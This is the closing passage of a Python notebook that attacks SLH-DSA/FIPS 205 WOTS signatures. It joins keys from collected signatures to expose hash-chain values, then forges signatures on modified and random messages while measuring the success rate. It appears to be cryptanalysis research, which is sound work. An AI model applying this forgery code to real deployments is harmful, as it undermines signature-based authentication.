    "    with open(\"../sigs_filtered.txt\", \"w\") as f:\n",
    "        for sig in filtered_sigs:\n",
    "            f.write(sig.hex() + \"\\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b9195f61",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Join WOTS keys to get a WOTS key usable for signing as many messages as possible\n",
    "from copy import deepcopy\n",
    "\n",
    "\n",
    "def join_sigs(wots_keys: dict[fips205.ADRS, set[fips205.WOTSKeyData]], params, pk_seed) -> dict[fips205.ADRS, fips205.WOTSKeyData]:\n",
    "    joined_sigs = {}\n",
    "    valid_sigs = valid_sigs_d(wots_keys)\n",
    "    for adrs, keys in wots_keys.items():\n",
    "        if len(keys) < 2:\n",
    "            continue\n",
    "        retval = deepcopy(valid_sigs[adrs])\n",
    "        if not retval.chains_calculated:\n",
    "            print_adrs(adrs)\n",
    "            retval.calculate_intermediates(params, adrs, pk_seed, valid_sigs[adrs])\n",
    "        for key in keys:\n",
    "            retval = retval.join(key, params)\n",
    "        joined_sigs[adrs] = retval\n",
    "    return joined_sigs\n",
    "\n",
    "joined_sigs = join_sigs(groups, params, pk_seed)\n",
    "print(f\"Joined {len(joined_sigs)} signatures\")\n",
    "\n",
    "\"\"\"\n",
    "for adrs, key in joined_sigs.items():\n",
    "    print_adrs(adrs, verbose=True)\n",
    "    print_key_data(key, adrs, pk_seed, None)\n",
    "\"\"\"\n",
    "\n",
    "# Filter out signatures with unresolved chains\n",
    "joined_sigs = {adrs: key for adrs, key in joined_sigs.items() if all(c < slh.w for c in key.chains_calculated)}\n",
    "\n",
    "print(f\"Filtered {len(joined_sigs)} (unresolved chains)\")\n",
    "\n",
    "# Filter out signatures with all chains set to 0\n",
    "joined_sigs = {adrs: key for adrs, key in joined_sigs.items() if any(c > 0 for c in key.chains_calculated)}\n",
    "print(f\"Filtered {len(joined_sigs)} (wildcard chains)\")\n",
    "\n",
    "\"\"\"\n",
    "for adrs, key in joined_sigs.items():\n",
    "    print_adrs(adrs, verbose=True)\n",
    "    print_key_data(key, adrs, pk_seed, None)\n",
    "\"\"\" \n",
    "\n",
    "# Find the key where the maximum number of chains are exposed (i.e., valid_sig.chain[i] - c is maximized for all chains 0 <= i < len)\n",
    "def score(key: fips205.WOTSKeyData, valid_sig: fips205.WOTSKeyData) -> int:\n",
    "    score = sum(valid_sig.chains[i] - c for i, c in enumerate(key.chains_calculated))\n",
    "    #msg_score = sum((slh.w - 1 - c for c in valid_sig.chains_calculated))\n",
    "    #cksum_score = sum(slh.w - 1 - c for _, c in enumerate(key.chains_calculated[slh.len1:]))\n",
    "    return score\n",
    "most_exposed_adrs, most_exposed_key = max(\n",
    "    joined_sigs.items(),\n",
    "    key=lambda item: score(item[1], valid_sigs[item[0]])\n",
    ")\n",
    "print(\"Key with most exposed chains (score: {}):\".format(\n",
    "    score(most_exposed_key, valid_sigs[most_exposed_adrs])\n",
    "))\n",
    "print_adrs(most_exposed_adrs, verbose=True)\n",
    "print_key_data(most_exposed_key, most_exposed_adrs, pk_seed, None)\n",
    "\n",
    "# try to sign the original message with the exposed key\n",
    "print(\"Signing original (valid) msg with exposed key...\")\n",
    "assert most_exposed_key.try_sign(most_exposed_key.chains, most_exposed_adrs, pk_seed, params)\n",
    "\n",
    "# signing message with same checksum\n",
    "# Find two offsets i, j where the chain is partially exposed\n",
    "exposed_offsets = [(idx, c - cc) for idx, (c, cc) in enumerate(zip(most_exposed_key.chains[:slh.len1], most_exposed_key.chains_calculated[:slh.len1])) if abs(c - cc) > 0]\n",
    "if len(exposed_offsets) >= 2:\n",
    "    i, j = exposed_offsets[:2]\n",
    "    print(f\"Found exposed offsets: i={i}, j={j}\")\n",
    "    chains = most_exposed_key.chains_calculated.copy()\n",
    "    chains[i[0]] += 1\n",
    "    print(\"Signing modified message with exposed key...\")\n",
    "    assert most_exposed_key.try_sign(chains, most_exposed_adrs, pk_seed, params)\n",
    "else:\n",
    "    print(\"Not enough exposed offsets found\")\n",
    "\n",
    "print(\"=\"*64)\n",
    "print(\"All keys for exposed address:\")\n",
    "print_adrs(most_exposed_adrs, verbose=True)\n",
    "for key in groups[most_exposed_adrs]:\n",
    "    print_key_data(key, most_exposed_adrs, pk_seed, valid_sigs[most_exposed_adrs])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10acdae2",
   "metadata": {},
   "outputs": [],
   "source": [
    "import math\n",
    "from multiprocessing import Pool\n",
    "from os import cpu_count\n",
    "from cryptanalysis_lib import sign_worker\n",
    "\n",
    "def sign_message_batch_mp(total_msgs, joined_sigs_items, msg_len, pk_seed, params, num_procs=None):\n",
    "    \"\"\"\n",
    "    Use a process pool to sign `total_msgs` messages *per* (adrs,key).\n",
    "    Returns the grand total of successful signatures.\n",
    "    \"\"\"\n",
    "    if num_procs is None:\n",
    "        num_procs = cpu_count()\n",
    "\n",
    "    # Split total_msgs into roughly equal chunks per process\n",
    "    per_proc = math.ceil(total_msgs / num_procs)\n",
    "    print(\"Total messages per process:\", per_proc)\n",
    "\n",
    "    # Build one work item per (process x key)\n",
    "    work = []\n",
    "    for adrs, key in joined_sigs_items.items():\n",
    "        for _ in range(num_procs):\n",
    "            work.append((per_proc, msg_len, adrs, key, pk_seed, params))\n",
    "\n",
    "    # Spawn the pool\n",
    "    with Pool(processes=num_procs) as pool:\n",
    "        # map returns one result per work item\n",
    "        results = pool.map(sign_worker, work, chunksize=1)\n",
    "\n",
    "    return sum(results)\n",
    "\n",
    "num_sigs = 2**10\n",
    "\n",
    "total_success = sign_message_batch_mp(num_sigs, {most_exposed_adrs: most_exposed_key}, slh.len1, pk_seed, params, num_procs=cpu_count()-2)\n",
    "\n",
    "print(\"Total messages signed:\", num_sigs)\n",
    "print(\"Total successful signatures:\", total_success)\n",
    "print(\"Success ratio:\", total_success/num_sigs)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
